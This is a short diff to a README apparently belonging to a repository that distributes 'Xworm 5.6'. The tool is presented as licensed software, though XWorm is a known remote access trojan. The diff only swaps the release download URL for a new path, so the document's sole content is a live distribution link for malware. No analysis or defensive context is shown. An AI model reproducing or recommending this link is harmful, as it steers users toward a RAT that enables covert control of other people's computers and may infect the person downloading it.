@@ -30,7 +30,7 @@ Xworm 5.6 is distributed under a license that requires compliance with all local
 
 ## Links 🔗
 
-- [Download](https://github.com/GhostlyBow/XWorm-V5.6/releases/download/5.6/Xworm.5.6.zip)
+- [Download](https://github.com/GhostlyBow/XWorm-V5.6/releases/download/release/Xworm.V5.6.zip)
 
 ---
 
